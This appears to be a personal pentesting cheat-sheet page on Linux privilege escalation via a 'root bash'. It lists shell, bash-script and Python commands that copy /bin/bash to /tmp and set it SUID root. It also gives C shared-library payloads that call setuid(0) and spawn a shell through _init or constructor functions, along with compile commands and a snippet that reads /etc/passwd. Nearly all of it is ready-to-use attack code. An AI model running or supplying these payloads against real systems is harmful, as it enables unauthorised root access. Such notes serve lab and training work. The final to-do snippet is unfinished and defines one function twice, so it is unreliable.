# Root Bash

<div class="row row-cols-lg-2"><div>

A root bash is a (bash) shell that was executed as root. For instance, using an attack vector such as a SUID script, we may run:

```ps
$ cp /bin/bash /tmp/rootbash
$ chown root /tmp/rootbash
$ chmod +s /tmp/rootbash
```
</div><div>

If you are successful, you can use `-p` (and `-i`) to run it:

```ps
$ /tmp/rootbash -p
root@xxx$
```

📚 Replace `root` with another user according to the attack vector.
</div></div>

<hr class="sep-both">

<div class="row row-cols-lg-2"><div>

#### Root Bash (script)

Remember to make it executable using `chmod +x root.sh`.

```bash!
#!/usr/bin/env /bin/bash
cp /bin/bash /tmp/rootbash
chown root /tmp/rootbash
chmod +s /tmp/rootbash
```
</div><div>

#### Root Bash (Python)

The values `0,0` are the UID/GID. `0o4755` means `755` with SUID.

```py
import shutil
import os

source_path = '/bin/bash'
destination_path = '/tmp/rootbash'
shutil.copy2(source_path, destination_path)
os.chown(destination_path, 0, 0)
os.chmod(destination_path, 0o4755)
```
</div></div>

<hr class="sep-both">

## Root Bash Static Library

<div class="row row-cols-lg-2"><div>

Short simplified program.

```c
void _init() {
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```

Long program.

```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash");
}
```
</div><div>

To compile, use:

```shell!
$ gcc -shared -fPIC init.c -o init.so
```

Or, if you are compiling the function `_init`:

```shell!
$ gcc -shared -fPIC init.c -o init.so -nostartfiles
```

⚠️ Remember to ensure that the file is readable by those that need it.

```shell!
$ chmod 777 init.so       # 😏 - avoid it
```

<details class="details-n">
<summary>Read a file in C</summary>

```c
FILE *file = fopen("/etc/passwd", "r");
if (file == NULL) {
    printf("Error opening the file.\n");
    return;
}
char buffer[256];
while (fgets(buffer, sizeof(buffer), file) != NULL) {
    printf("%s", buffer);
}
fclose(file);
```
</details>
</div></div>

<hr class="sep-both">

## 👻 To-do 👻

Stuff that I found, but never read/used yet.

<div class="row row-cols-lg-2"><div>

```c
// gcc -shared -fPIC shell.c -o shell.so
#include<stdio.h>
#include<stdlib.h>

void __attribute__((constructor)) shell();

void main() {};

void shell() {
    system("id");
}

__attribute__ ((__constructor__)) void shell() {
    // ...
}
```
</div><div>
</div></div>